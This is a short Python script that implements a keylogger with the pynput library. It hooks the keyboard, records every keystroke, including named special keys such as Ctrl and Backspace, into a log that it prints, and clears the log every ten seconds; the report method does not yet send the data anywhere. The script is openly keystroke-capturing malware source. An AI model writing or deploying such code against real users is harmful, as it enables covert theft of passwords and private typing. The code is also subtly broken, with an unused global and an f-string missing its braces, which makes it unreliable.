#!/usr/bin/env python3
import pynput.keyboard
import threading





class keylogger:
    
    def __init__(self):
        self.log = ""
    
    def pulsacion(self, key):
        global log
        try:
            self.log  += str(key.char)
            
        except AttributeError:
            
            spacial_keys = {
                key.shift: "Shift",
                key.ctrl: "Ctrl",
                key.alt: "Alt",
                key.cmd: "Cmd",
                key.caps_lock: "Caps Lock",
                key.tab: "Tab",
                key.backspace: "Backspace",
                key.delete: "Delete",
                key.esc: "Escape",
                key.up: "Up Arrow",
            }
            self.log += spacial_keys.get(key, f" str(key) ")
        
            
        print(self.log)
        
        
    def report(self):
        
        self.log = ""
        
        timer = threading.Timer(10, self.report)
        timer.start()

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.pulsacion)

        with keyboard_listener:
            self.report()
            keyboard_listener.join()